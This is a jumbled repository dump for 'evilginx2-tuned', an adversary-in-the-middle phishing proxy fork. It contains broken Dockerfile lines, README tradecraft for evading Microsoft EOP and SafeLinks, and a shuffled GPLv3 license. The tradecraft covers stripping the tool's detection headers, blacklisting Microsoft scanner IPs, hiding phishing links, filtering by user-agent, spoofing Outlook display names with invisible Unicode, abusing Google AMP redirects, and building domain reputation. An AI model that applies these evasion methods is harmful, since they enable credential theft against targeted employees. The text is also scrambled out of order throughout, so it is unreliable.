FROM golang:1.13.1-alpine as build
RUN wget -O /usr/local/bin/dep https://github.com/golang/dep/releases/download/v0.5.0/dep-linux-amd64 
RUN go mod download
x /usr/local/bin/dep
COPY go.mod go.sum ./
 chmod 
FROM alpine:3.8
"VOLUME [""/app/phishlets/""]"
COPY --from=build /go/src/github.com/kgretzky/evilginx2/bin/evilginx /app/evilginx
WORKDIR /go/src/github.com/kgretzky/evilginx2
    ca-certificates 
"ENTRYPOINT [""/app/evilginx""]"
WORKDIR /app
RUN go build -o ./bin/evilginx main.go
 rm -rf /var/cache/apk/
RUN apk add --update 
ENV GO111MODULE on
COPY . /go/src/github.com/kgretzky/evilginx2
.yaml /app/phishlets/
EXPOSE 443 80 53/udp
    git 
COPY ./phishlets/
 0x88
CrOS
Ubuntu
"The ""display name"" field in the email can be used to manipulate to ""from email"" field off the screen."
2009)
2005)
"A PowerShell Core [tool](https://github.com/aalex954/ASN-2-IP) to track Microsoft IPs for use in security research, firewall configuration, routing, and troubleshooting."
- Six-Per-Em Space (U
2006)
view=o365-worldwide
bash
- Em Space (U
- https://endpoints.office.com/endpoints/worldwide
X-Evilginx : {req.Host}
(Windows NT 10.0
clientrequestid=b10c5ed1-bad1-445f-b386-b919946339a7
" Manipulate ""Display Name"" for Outlook"
u180E
"Microsoft reports IP ranges and their associated roles, it can be referenced here:"
<colleague2@company.com>
colleague4
 DNS
u2800
- En Quad (U
205F)
 CloudFlare CAPTCHA
u200A
> decrypt byte array using bitwise XOR operation with constant 0x88
2007)
evilginx2-tuned/core/http_proxy.go
- https://learn.microsoft.com/en-us/microsoft-365/enterprise/urls-and-ip-address-ranges
 _dmarc.DOMAIN.COM 
 BlueCoat
00A0)
"A fork of kgretzky/evilginx2 including my TTPs, IOC header removal, customizations and additional configurations to prevent detections by EOP/SafeLinks."
colleague3
https://www.google.co.uk/amp/s/
or more generically
colleague7>
2008)
u3000
"> for n, c := range b {"
> decrypted string
"> []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}"
u200D
 Site Classification
u2000-
2028)
A TXT record needs to be created containing the following
> header
 0x45
> byte sequence
It is best practice to use aged domains due as newer domains are susceptible to being flagged for being recently created. Organizations can actually configure their email filtering to recognize newly registered domains to ensure they are blocked from entering their employees' mailboxes. Domains should be aged as long as possible before being used in a campaign. 
Windows NT 6.1
- SPF / DKIM
 An updated list can be downloaded here
> byte array of hex values
u2800]
colleague5
- Checkpoint
The lure URL can be embedded into the Google AMP URL like this:
0020)
A custom blacklist file has been included in this repo. It is located at 
u0020
Google Accelerated Mobile Pages (AMP) can be abused to bypass phishing protections by presenting a trustworthy domain with containing a redirect.
- Hair Space (U
"> req.Header.Set(string(hg), egg2)"
 p=quarantine
- Brightcloud
- Four-Per-Em Space (U
200C)
 Domain Aging
This [list](https://github.com/aalex954/MSFT-IP-Tracker) is generated and published each day representing all IP address ranges owned by Microsoft as reported by WHOIS/ASN ownership.
- Space (U
 v=DMARC1
request header containing the following:
- Ideographic Space (U
> if request authorized
2001)
"Because the ""display name"" and ""from email"" are in the same visual element, the ""from email"" can be manipulated by pushing it out of the displayed element using non-visable Unicode characters."
https://www.google.com/amp/s/
- Line Separator (U
 selector1._domainkey 
colleague7
phish_url
 Generate New Blacklist
"> Set an _ua_filter_ option for any of your lures, as a whitelist regular expression, and only requests with matching User-Agent header will be authorized."
 IOC Removal
<personal.mail1@outlook.com>
 Value 
 Key 
u202F
https://cofense.com/blog/google-amp-the-newest-of-evasive-phishing-tactic/
This regex pattern will allow any user-agents that are not included in the pattern:
Some possible characters:
- Em Quad (U
- Three-Per-Em Space (U
Although somewhat redundant (in the context of EOP) an updated list can be generated.
- Paragraph Separator (U
- Medium Mathematical Space (U
Regex pattern: 
> X-Evilginx : {req.Host} 
- En Space (U
 Detection
phishlets hide outlook
> [80 253 149 118 169 176 183 169 182 184]
 egg2
u2028-
Your Manager <your.manager@company.com>
- Zero Width Space (U
u205F
 User-agent Filtering
x1dh
 Removed Code
"> p.cantFindMe(req, e_host)"
/.evilginx/
> function takes hostname
> outlook is used here as an example
 MSFT-IP-Tracker
![Screenshot 2023-08-08 234239](https://github.com/aalex954/evilginx2-tuned/assets/6628565/a88127e3-04fa-4a0a-8257-938e7736fbd7)
"x003,)"
> X-Evilginx: : [80 253 149 118 169 176 183 169 182 184]
<colleague1@company.com>
---------------------------------
This pattern now matches any number of words followed by a sequence of blank-appearing characters and then any sequence of characters afterward.
> set request header
![Screenshot 2023-08-08 235841](https://github.com/aalex954/evilginx2-tuned/assets/6628565/68be4518-b1d5-476c-9c0b-ce7a0aa1a255)
Ensure your site is categorized by one or more of the following:
1680)
"This regex should match a string with any number of words followed by a sequence of blank-appearing characters, then the ""To:"" string, and an email."
> store request url
2004)
u1680
200A)
200D)
 IP Blacklist
<colleague5@company.com>
"http.Request, nothing_to_see_here string)"
For example:
 directory.
> decrypt string using bitwise XOR operation with constant 0x45
"> for n, b := range e {"
All credit goes to: https://gitlab.com/email_bug/outlook_email_auth_bypass
:Googlebot
200B)
- EOP/MSFT IP Blacklist
"> ""X-Evilginx"""
- Site Ranking
In an attempt to prevent EOP from scanning the phishing links a blacklist was generated and includes all IP addresses associated to MSFT owned ASNs.
- Ogham Space Mark (U
u200B-
2800)
"To counter this, a regex pattern can be used:"
- Narrow No-Break Space (U
YandexAccessibilityBot
 Domain Names
This file needs to be copied into the 
"> req.Header.Set(string(e), e_host)"
 DKIM - DomainKeys Identified Mail
"Site categorization is used to determine specific categories for a website. If this step is skipped, a domain is at risk for being seen as uncategorized, which may look suspicious and end up getting flagged as malicious."
<colleague4@company.com>
 Google AMP Redirects
Would display similar to this:
"It is best to usually categorize your site as Business, Finance, or IT. It is important to use a real email address and have real content pointing to your 'www' A record to ensure the site looks like a reputable domain. Site categorization takes up to 1-2 days. You can check on the status of your site by revisiting a few of the links mentioned above."
Removed both IOC headers in 
[msft_asn_ip_ranges.txt](https://github.com/aalex954/MSFT-IP-Tracker/releases/latest/download/msft_asn_ip_ranges.txt)
180E)
bingbot)).
>    hg[n] = b 
Your Manager
- Punctuation Space (U
"> req.Header.Set(string(b), nothing_to_see_here)"
2029)
- Symantec 
"Before sending out the phishing email, hide the phishlet by issuing this command:"
- Palo Alto
- Braille Pattern Blank (U
 selector1-contoso-com._domainkey.contoso.onmicrosoft.com
- Domain Aging
 SPF / DKIM Records
- Figure Space (U
3000)
X-Evilginx: : [80 253 149 118 169 176 183 169 182 184] 
" Hello, World!"
 or 
u00A0
User-agent filtering allows you to filter requests to your phishing link based on the originating _User-Agent_ header and may be useful to prevent link scanning.
TODO
"The steps to generate a domain key will be different depending on your email provider. Ultimately, this information will be put into a TXT record similar to what we did for SPF."
2003)
2002)
> cantFindMe(req 
While DKIM isn
> encrypted string as byte array
- Sophos (submission only)
202F)
wget https://github.com/aalex954/MSFT-IP-Tracker/releases/latest/download/msft_asn_ip_ranges.txt
- Zero Width Non-Joiner (U
> bitwise XOR
- IOC Removal
- TrendMicro
phishlets unhide outlook
 evilginx2-TTPs
"> for n, b := range hg {"
"The domains age, clasification, and usage of proper email verification techniques all impact the reputation."
--------------------
 pct=100
 0xCC
An updated blaklist can be generated using one of the methods below.
During the initial stages of the campaign you may want to hide your phishlet so that EOP does not have a chance to scan the URL.
2000)
"lures edit <id> ua_filter ""REGEX_PATTERN"""
Hiding a phishlet essentially redirects requests to a hidden phishlet to a URL that is defined in the config section.
- Zero Width Joiner (U
u2029
colleague1
"t required, having emails that are signed with DKIM appear more legitimate to your recipients and are less likely to end up in the junk or spam folders."
- User-Agent Filtering
- Mongolian Vowel Separator (U
To perform any phishing attack you must control some domain. Its a good idea to buy a handful every few months so you always have aged domains on hand. Try choosing domain names that makes sense in the context of your campaign. Generic sounding domains containing keywords such as 'corporate' or 'internal' are safe bets. Also consider the phishing lure being used. 
This is working in Outlook desktop and OWA as of 08/08/23
e[n] = b 
After about 10 minutes you can unhide the phsihlet. 
 SPF - Sender Policy Framework
"A downside to this method is that if a user clicks on the phishing email in the first 10 minutes, they will be reditected and will not get phished."
<colleague3@company.com>
colleague6
- Thin Space (U
"- Manipulate ""Display Name"" for Outlook"
> set the request header with decrypted string
- Fortiguard
colleague2
"> e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}"
> base-64 decoded
Custom/blacklist.txt
 Hide
"To increase our chance of bypassing EOP, SafeLinks, spam filtering, etc. we need to try to increase our domains reputation. "
Here is an example of a regex pattern that allows only the following user-agents:
 ASN2IP
> decrypted byte array
b[n] = c 
> I have discovered EOP __does__ connect from IPs that are not listed in the above links.
> egg2 := req.Host
sTo:
"> var b []byte = []byte("""
Macintosh
- No-Break Space (U
Syntax:
- Google AMP Redirects
- CloudFlare CAPTCHA
version
All rights granted under this License are granted for the term of copyright on the
has it or can get it with reasonable efforts.
the Corresponding Source along with the object code. If the place to copy the object
"trademarks, or service marks"
"sure that they, too, receive or can get the source code. And you must show them these"
"Notwithstanding any other provision of this License, for material you add to a"
 0. Definitions
through the same place at no further charge. You need not require recipients to copy
"would be infringed by some manner, permitted by this License, of making, using, or"
"no warranty for this free software. For both users' and authors' sake, the GPL"
 the above requirements apply
"covered work, for which you have or can give appropriate copyright permission."
    This program comes with ABSOLUTELY NO WARRANTY
modified version
"DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION."
If the disclaimer of warranty and limitation of liability provided above cannot be
source code
 the earlier work.
sublicenses in a manner consistent with the requirements of this License.
"If, pursuant to or in connection with a single transaction or arrangement, you"
"license to some of the parties receiving the covered work authorizing them to use,"
QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU. SHOULD THE PROGRAM PROVE
attributions in that material or in the Appropriate Legal Notices displayed by works
"that class of product, regardless of the status of the particular user or of the way"
under applicable patent law.
applicable law fulfilling obligations under article 11 of the WIPO copyright treaty
applies also to any other work released this way by its authors. You can apply it to
"General Public License into a single combined work, and to convey the resulting work."
Object code
these requirements.
or any later
beyond what the individual works permit. Inclusion of a covered work in an aggregate
 offer you this License giving you legal permission
with you.
further
"applicable copyright law, except executing it on a computer or modifying a private"
if the copyright holder fails to notify you of the violation by some reasonable means
"    along with this program.  If not, see <http://www.gnu.org/licenses/>."
    (at your option) any later version.
parties who have received copies or rights from you under this License. If your
 if it does not include within the
    it under the terms of the GNU General Public License as published by
    under certain conditions
"it does not include the work's System Libraries, or general-purpose tools or"
this section must be in a format that is publicly documented (and with an
"liability to the recipient, for any liability that these contractual assumptions"
"law. If additional permissions apply only to part of the Program, that part may be"
"licensees may convey the work under this License, and how to view a copy of this"
"proprietary programs. If your program is a subroutine library, you may consider it"
"applied to a free program could make it effectively proprietary. To prevent this, the"
User Product
automatically from other parts of the Corresponding Source.
systematic pattern of such abuse occurs in the area of products for individuals to
functioning of the modified object code is in no case prevented or interfered with
" applies to it, you have the option of following the terms and"
relicensing or conveying.
"information on this, and how to apply and follow the GNU GPL, see"
object code work.
"You may make, run and propagate covered works that you do not convey, without"
infringement). To 
directly impose on those licensors and authors.
"General Public License, you may choose any version ever published by the Free"
"characterized), the Corresponding Source conveyed under this section must be"
A patent license is 
"given local legal effect according to their terms, reviewing courts shall apply local"
modify
sections 15 and 16 of this License
 if the compilation and its resulting
"patent license for this particular work, or "
License. Each licensee is addressed as 
and protocols for communication across the network.
_Copyright 
a copy of the Program in return for a fee.
 5. Conveying Modified Source Versions
"code and to modify the work, including scripts to control those activities. However,"
" WITHOUT WARRANTY OF ANY KIND, EITHER"
This License
express permission to practice a patent or covenant not to sue for patent
supplement the terms of this License with terms:
 of the earlier work or a
this License without regard to the additional permissions.
"covered work, you may (if authorized by the copyright holders of that material)"
"it such as to form a larger program, in or on a volume of a storage or distribution"
"You may convey verbatim copies of the Program's source code as you receive it, in any"
 assert
neither you nor any third party retains the ability to install modified object code
durable physical medium customarily used for software interchange.
 access to copy the Corresponding Source from a network server at no
its Corresponding Source. The information must suffice to ensure that the continued
kinds of works.
"or other charge for exercise of rights granted under this License, and you may not"
GNU General Public License
the source code for shared libraries and dynamically linked subprograms that the work
"rights have been terminated and not permanently reinstated, you do not qualify to"
"When you convey a covered work, you waive any legal power to forbid circumvention of"
 to the
Some devices are designed to deny users access to install or run modified versions of
"If the program does terminal interaction, make it output a short notice like this"
", which"
payment to the third party based on the extent of your activity of conveying the
Nothing in this License shall be construed as excluding or limiting any implied
" permanently,"
copyright are not used to limit the access or legal rights of the compilation's users
Conveying under any other circumstances is permitted solely under the conditions
"work in any other way, but it does not invalidate such permission if you have"
grant
initiate litigation (including a cross-claim or counterclaim in a lawsuit) alleging
EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
generally available free programs which are used unmodified in performing those
Free Software Foundation. If the Program does not specify a version number of the GNU
"Additional terms, permissive or non-permissive, may be stated in the form of a"
additional obligations are imposed on any author or copyright holder as a result of
" provisionally, unless and until the"
 is a transaction transferring control of an
"Corresponding Source of the work is not available for anyone to copy, free of charge"
show c
 may be individuals or organizations.
"dwelling. In determining whether a product is a consumer product, doubtful cases"
"organization, or substantially all assets of one, or subdividing an organization, or"
contributor version
modified or installed. Access to a network may be denied when the modification itself
when it starts in an interactive mode:
" for a User Product means any methods,"
Software Foundation.
"medium, provided that you conspicuously and appropriately publish on each copy an"
"work, but the special requirements of the GNU Affero General Public License, section"
explicitly affirms your unlimited permission to run the unmodified Program. The
of such measures.
 line and a pointer to
 means either the unmodified Program or a work based on
"the work as a whole, that "
law that most closely approximates an absolute waiver of all civil liability in
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
"If you convey a covered work, knowingly relying on a patent license, and the"
indicate your acceptance of this License to do so.
"If you develop a new program, and you want it to be of the greatest possible use to"
"rights under this License with respect to the covered work, and you disclaim any"
"acceptance. However, nothing other than this License grants you permission to"
"from the original licensors, to run, modify and propagate that work, subject to this"
"those domains in future versions of the GPL, as needed to protect the freedom of"
 16. Limitation of Liability
"standard defined by a recognized standards body, or, in the case of interfaces"
You may not impose any further restrictions on the exercise of the rights granted or
"accept this License. Therefore, by modifying or propagating a covered work, you"
works to others for the sole purpose of having them make modifications exclusively
"it, or any part of it, contains a notice stating that it is governed by this License"
where the full notice is found.
"other readily accessible means, then you must either "
"To protect your rights, we need to prevent others from denying you these rights or"
 a work means to copy from or adapt all or part of the work in
PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE
copyright disclaimer
"Later license versions may give you additional or different permissions. However, no"
license document contains a further restriction but permits relicensing or conveying
either way.
 such a patent license to a party means to make
"that any patent claim is infringed by making, using, selling, offering for sale, or"
"import and otherwise run, modify and propagate the contents of its contributor"
support or warranty protection for a fee.
 How to Apply These Terms to Your New Programs
aggregate
this License along with the Program.
"the covered work, unless you entered into that arrangement, or that patent license"
consumer product
" The work must carry prominent notices stating that you modified it, and giving a"
"you distribute copies of the software, or if you modify it: responsibilities to"
" a work means to do anything with it that, without"
"THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW."
Also add information on how to contact you by electronic and paper mail.
"was granted, prior to 28 March 2007."
 2. Basic Permissions
version permanently authorizes you to choose that version for the Program.
"noncommercially, and only if you received the object code with such an offer, in"
"License, on a durable physical medium customarily used for software interchange, for"
"a fashion requiring copyright permission, other than the making of an exact copy. The"
Termination of your rights under this section does not terminate the licenses of
"copy. Propagation includes copying, distribution (with or without modification),"
"making available to the public, and in some countries other activities as well."
The terms of this License will continue to apply to the part which is the covered
"menu, a prominent item in the list meets this criterion."
interpreter used to run it.
control
    GNU General Public License for more details.
 section 10 makes it unnecessary.
"affirmed under this License. For example, you may not impose a license fee, royalty,"
Standard Interface
offered to the general public at no charge under subsection 6d.
" Declining to grant rights under trademark law for use of some trade names,"
"In the following three paragraphs, a "
 TERMS AND CONDITIONS
agree to terms that obligate you to collect a royalty for further conveying from
Public Licenses are designed to make sure that you have the freedom to distribute
primarily for and in connection with specific products or compilations that contain
 6. Conveying Non-Source Forms
", in this context, means a major essential component"
 tells the user that there is no
granted under the third paragraph of section 11).
The hypothetical commands 
"controlled by the contributor, whether already acquired or hereafter acquired, that"
"implementation available to the public in source code form), and must require no"
modified versions of such material be marked in reasonable ways as different from the
You are not required to accept this License in order to receive or run a copy of the
" Convey the object code in, or embodied in, a physical product (including a"
recipients
 also means copyright-like laws that apply to other kinds of
"source, or "
 in connection with
merging organizations. If propagation of a covered work results from an entity
License of the Program or a work on which the Program is based. The work thus
IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY
"the covered work from you, a discriminatory patent license "
conditions either of that numbered version or of any later version published by the
"connection with the Program, unless a warranty or assumption of liability accompanies"
"Program, and are irrevocable provided the stated conditions are met. This License"
Copyright
 8. Termination
"exclusively on your behalf, under your direction and control, on terms that prohibit"
"physical distribution medium), accompanied by a written offer, valid for at least"
comply with the terms of this License in conveying all material for which you do not
Notices
them from making any copies of your copyrighted material outside their relationship
relevant date.
 and give all recipients a copy of
"is specifically designed to require, such as by intimate data communication or"
"Moreover, your license from a particular copyright holder is reinstated permanently"
"works, such as semiconductor masks."
"the Corresponding Source. Regardless of what server hosts the Corresponding Source,"
 is any express
other peers where the object code and Corresponding Source of the work are being
"it in new free programs, and that you know you can do these things."
permissions may be written to require their own removal in certain cases when you
the only significant mode of use of the product.
control copyright. Those thus making or running the covered works for you must do so
"separately written license, or stated as exceptions"
regardless of how they are packaged. This License gives no permission to license the
"intention to limit operation or modification of the work as a means of enforcing,"
"5, provided that you also convey the machine-readable Corresponding Source under the"
"General Public License can be used, that proxy's public statement of acceptance of a"
Program. Ancillary propagation of a covered work occurring solely as a consequence of
the right of possession and use of the User Product is transferred to the recipient
"For example, if you distribute copies of such a program, whether gratis or for a fee,"
provide the Corresponding Source. This alternative is allowed only occasionally and
combine any covered work with a work licensed under version 3 of the GNU Affero
"particular user, "
 should show the appropriate parts of
 Preamble
"to copy, distribute and/or modify it."
 and 
"adopted on 20 December 1996, or similar laws prohibiting or restricting circumvention"
<http://fsf.org/>
"If conditions are imposed on you (whether by court order, agreement or otherwise)"
"procedures, authorization keys, or other information required to install and execute"
entity transaction
"that product model, to give anyone who possesses the object code either "
"those to whom you convey the Program, the only way you could satisfy both those terms"
"a third party that is in the business of distributing software, under which you make"
"if the copyright holder notifies you of the violation by some reasonable means, this"
three years and valid for as long as you offer spare parts or customer support for
"along with a term that is a further restriction, you may remove that term. If a"
"not by their nature extensions of the covered work, and which are not combined with"
only as a consequence of further modification of the contributor version. For
"the relevant source files, a statement of the additional terms that apply to those"
 a work means any kind of propagation that enables other
you remain obligated to ensure that it is available for as long as needed to satisfy
"medium, is called an "
 3. Protecting Users' Legal Rights From Anti-Circumvention Law
version.
"Corresponding Source of the work from the predecessor in interest, if the predecessor"
"For the developers' and authors' protection, the GPL clearly explains that there is"
 1. Source Code
"means any tangible personal property which is normally used for personal, family, or"
separately received it.
discriminatory
License.
sign a 
covered work
"and under the terms of this License, through a publicly available network server or"
"given its content, constitutes a covered work. This License acknowledges your rights"
Appropriate Legal Notices
to the start of each source file to most effectively state the exclusion of warranty
normally used
License. You may not convey a covered work if you are a party to an arrangement with
Additional permissions
" means you have actual knowledge that, but"
"To do so, attach the following notices to the program. It is safest to attach them"
"terms of this License, in one of these ways:"
identifiable patents in that country that you have reason to believe are valid.
"Notwithstanding any other provision of this License, you have permission to link or"
prior to 60 days after the cessation.
The 
 keep intact all notices stating that this License and
accompanied by the Installation Information. But this requirement does not apply if
An interactive user interface displays 
GPL assures that patents cannot be used to render the program non-free.
"However, if you cease all violation of this License, then your license from a"
works based on it.
essential patent claims
Everyone is permitted to copy and distribute verbatim copies of this license
==========================
"physical distribution medium), accompanied by the Corresponding Source fixed on a"
"that contradict the conditions of this License, they do not excuse you from the"
 refers to version 3 of the GNU General Public License.
is the first time you have received notice of violation of this License (for any
 for details type 'show w'.
    This program is free software: you can redistribute it and/or modify
"files, or a notice indicating where to find the applicable terms."
PROVIDE THE PROGRAM 
 Requiring indemnification of licensors and authors of that material by anyone
be attributed erroneously to authors of previous versions.
"that license document, provided that the further restriction does not survive such"
using peer-to-peer transmission to receive a copy likewise does not require
The GNU General Public License does not permit incorporating your program into
"the public, the best way to achieve this is to make it free software which everyone"
 14. Revised Versions of this License
 is a copyright holder who authorizes use under this
"EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF"
"modified or installed by the recipient, or for the User Product in which it has been"
"substantial commercial, industrial or non-consumer uses, unless such uses represent"
INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE
copyright
and each file should have at least the 
"source code needed to generate, install, and (for an executable work) run the object"
"copyright on the software, and "
"permission, would make you directly or secondarily liable for infringement under"
    <program>  Copyright (C) <year>  <name of author>
provided you maintain clear directions next to the object code saying where to find
 Convey individual copies of the object code with a copy of the written offer to
not allow patents to restrict development and use of software on general-purpose
who conveys the material (or modified versions of it) with contractual assumptions of
respect the freedom of others.
" arrange, in a manner consistent with"
this version of the GPL to prohibit the practice for those products. If such problems
"specified for a particular programming language, one that is widely used among"
in perpetuity or for a fixed term (regardless of how the transaction is
The Corresponding Source need not include anything that users can regenerate
extent that it includes a convenient and prominently visible feature that 
" however, if the Program has interactive interfaces that do not display"
"for a GUI interface, you would use an "
automatically terminate your rights under this License (including any patent licenses
"propagate, modify or convey a specific copy of the covered work, then the patent"
solely because modification has been made.
"Each time you convey a covered work, the recipient automatically receives a license"
 Disclaiming warranty or limiting liability differently from the terms of
A contributor's 
 for a work means the preferred form of the work for
"output from running a covered work is covered by this License only if the output,"
 9. Acceptance Not Required for Having Copies
 type 'show c' for details.
" 2007 Free Software Foundation, Inc. "
does not cause this License to apply to the other parts of the aggregate.
"Each contributor grants you a non-exclusive, worldwide, royalty-free patent license"
"code or can get it if you want it, that you can change the software or use pieces of"
<http://www.gnu.org/philosophy/why-not-lgpl.html>
" for the program, if necessary. For more"
<http://www.gnu.org/licenses/>
 Limiting the use for publicity purposes of names of licensors or authors of the
original version
"the General Public License. Of course, your program's commands might be different"
"comes into possession of a copy. This License will therefore apply, along with any"
System Libraries
"this License. Any attempt otherwise to propagate or modify it is void, and will"
convey
 11. Patents
Corresponding Source
you also meet all of these conditions:
 a copy of
 refers to a typical or common use of
The Free Software Foundation may publish revised and/or new versions of the GNU
"The precise terms and conditions for copying, distribution and modification follow."
" Prohibiting misrepresentation of the origin of that material, or requiring that"
"Corresponding Source conveyed, and Installation Information provided, in accord with"
show w
"network, with no transfer of a copy, is not conveying."
 Requiring preservation of specified reasonable legal notices or author
receive new licenses for the same material under section 10.
"of fair use or other equivalent, as provided by copyright law."
"COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS THE PROGRAM AS"
 within the meaning of section 10. If the Program as you received
the Program.
particular copyright holder is reinstated 
"(kernel, window system, and so on) of the specific operating system (if any) on which"
"purposes of this definition, "
"The GNU General Public License is a free, copyleft license for software and other"
"transaction, each party to that transaction who receives a copy of the work also"
 serves only to
 refers to any copyrightable work licensed under this
license you grant is automatically extended to all recipients of the covered work and
terms so they know their rights.
License is intended to guarantee your freedom to share and change all versions of a
"WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE"
permissions that are applicable to the entire Program shall be treated as though they
"Component, but which is not part of that Major Component, and "
 without even the implied warranty of
"    the Free Software Foundation, either version 3 of the License, or"
"displays an appropriate copyright notice, and "
 Convey the object code by offering access from a designated place (gratis or for
"You should also get your employer (if you work as a programmer) or school, if any, to"
resulting work is called a 
"    This program is distributed in the hope that it will be useful,"
"computers, but in those that do, we wish to avoid the special danger that patents"
"your freedom to share and change the works. By contrast, the GNU General Public"
 7. Additional Terms
"A compilation of a covered work with other separate and independent works, which are"
"a charge), and offer equivalent access to the Corresponding Source in the same way"
"    This is free software, and you are welcome to redistribute it"
material
_END OF TERMS AND CONDITIONS_
"_Version 3, 29 June 2007_  "
 15. Disclaimer of Warranty
 4. Conveying Verbatim Copies
"You may charge any price or no price for each copy that you convey, and you may offer"
based on
"against the work's users, your or third parties' legal rights to forbid circumvention"
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. THE ENTIRE RISK AS TO THE
" You must license the entire work, as a whole, under this License to anyone who"
"If you add terms to a covered work in accord with this section, you must place, in"
 13. Use with the GNU Affero General Public License
"to the present version, but may differ in detail to address new problems or concerns."
"Appropriate Legal Notices, your work need not make them do so."
 means any non-source form of a
simultaneously your obligations under this License and any other pertinent
"the Program, in the form of source code under the terms of section 4, provided that"
product. A product is a consumer product regardless of whether the product has
 arrange to deprive yourself of the benefit of the
incompatible with the aim of protecting users' freedom to change the software. The
 keep
making modifications to it. 
"your programs, too."
The Corresponding Source for a work in source code form is that same work.
AS IS
" If the work has interactive user interfaces, each must display Appropriate Legal"
All other non-permissive additional terms are considered 
"applicable section 7 additional terms, to the whole of the work, and all its parts,"
"the requirements of this License, to extend the patent license to downstream"
"Finally, every program is threatened constantly by software patents. States should"
parties to make or receive copies. Mere interaction with a user through a computer
"(operated by you or a third party) that supports equivalent copying facilities,"
 anything designed or sold for incorporation into a
non-exercise of one or more of the rights that are specifically granted under this
a certain numbered version of the GNU General Public License 
"continue to provide support service, warranty, or updates for a work that has been"
"in which the particular user actually uses, or expects or is expected to use, the"
Installation Information
License. You are not responsible for enforcing compliance by third parties with this
licensed is called the contributor's 
No covered work shall be deemed part of an effective technological measure under any
    You should have received a copy of the GNU General Public License
License and any conditions added under section 7. This requirement modifies the
Each version is given a distinguishing version number. If the Program specifies that
"work, and under which the third party grants, to any of the parties who would receive"
"on the User Product (for example, the work has been installed in ROM)."
You may convey a covered work in object code form under the terms of sections 4 and
Developers that use the GNU GPL protect your rights with two steps: 
"When we speak of free software, we are referring to freedom, not price. Our General"
shall be resolved in favor of coverage. For a particular product received by a
materially and adversely affects the operation of the network or violates the rules
"for you, or provide you with facilities for running those works, provided that you"
"License. But first, please read"
"obligations, then as a consequence you may not convey it at all. For example, if you"
"copyright holder explicitly and finally terminates your license, and "
"could give under the previous paragraph, plus a right to possession of the"
requirement in section 4 to 
about box
"agreement or commitment, however denominated, not to enforce a patent (such as an"
 and
"13, concerning interaction through a network will apply to the combination as such."
The licenses for most software and other practical works are designed to take away
recipients. 
"selling its contributor version, but do not include claims that would be infringed"
can redistribute and change under these terms.
"work) from that copyright holder, and you cure the violation prior to 30 days after"
"for the patent license, your conveying the covered work in a country, or your"
keep intact all notices
"used separately under those permissions, but the entire Program remains governed by"
The Program
such an agreement or commitment not to enforce a patent against the party.
"copies of the covered work conveyed by you (or copies made from those copies), or "
"enable use of the work with that Major Component, or to implement a Standard"
OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE
POSSIBILITY OF SUCH DAMAGES.
 includes the right to grant patent
Licensees
Major Component
"If you convey an object code work under this section in, or with, or specifically for"
"use, which is precisely where it is most unacceptable. Therefore, we have designed"
patent license
"activities but which are not part of the work. For example, Corresponding Source"
you must pass on to the recipients the same freedoms that you received. You must make
"warranty for the work (except to the extent that warranties are provided), that"
 for a work in object code form means all the
technological measures to the extent such circumvention is effected by exercising
appropriate copyright notice
"copies of free software (and charge for them if you wish), that you receive source"
" Convey the object code using peer-to-peer transmission, provided you inform"
"were included in this License, to the extent that they are valid under applicable"
work 
General Public License from time to time. Such new versions will be similar in spirit
"A separable portion of the object code, whose source code is excluded from the"
charge.
"Source to be so available, or "
modified versions of a covered work in that User Product from a modified version of
    <one line to give the program's name and a brief idea of what it does.>
    but WITHOUT ANY WARRANTY
"When you convey a copy of a covered work, you may at your option remove any"
"additional permissions from that copy, or from any part of it. (Additional"
If the Program specifies that a proxy can decide which future versions of the GNU
"use in, a User Product, and the conveying occurs as part of a transaction in which"
"You may convey a work based on the Program, or the modifications to produce it from"
importing the Program or any portion of it.
contributor
"PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL,"
propagate
Knowingly relying
accord with subsection 6b.
containing it
any non-permissive terms added in accord with section 7 apply to the code
your receipt of the notice.
" of an executable work include anything, other than"
 are terms that supplement the terms of this
work.
developers working in that language.
"License. If the interface presents a list of user commands or options, such as a"
conditions of this License. If you cannot convey a covered work so as to satisfy
"document, but changing it is not allowed."
"special password or key for unpacking, reading or copying."
 means an interface that either is an official
"code is a network server, the Corresponding Source may be on a different server"
"convey, or propagate by procuring conveyance of, a covered work, and grant a patent"
restrictions
 17. Interpretation of Sections 15 and 16
"program--to make sure it remains free software for all its users. We, the Free"
 is included in the normal form of packaging a Major
your choosing to follow a later version.
Interface for which an implementation is available to the public in source code form.
"what you want to do, use the GNU Lesser General Public License instead of this"
License by making exceptions from one or more of its conditions. Additional
"the executable work runs, or a compiler used to produce the work, or an object code"
users.
more useful to permit linking proprietary applications with the library. If this is
and this License would be to refrain entirely from conveying the Program.
"scope of its coverage, prohibits the exercise of, or is conditioned on the"
"Software Foundation, use the GNU General Public License for most of our software"
"asking you to surrender the rights. Therefore, you have certain responsibilities if"
 The work must carry prominent notices stating that it is released under this
"the software inside them, although the manufacturer can do so. This is fundamentally"
The requirement to provide Installation Information does not include a requirement to
stated below. Sublicensing is not allowed
"requires that modified versions be marked as changed, so that their problems will not"
"arise substantially in other domains, we stand ready to extend this provision to"
the Corresponding Source for all the software in the product that is covered by this
 is either 
"modify the work.) You may place additional permissions on material, added by you to a"
license or other defenses to infringement that may otherwise be available to you
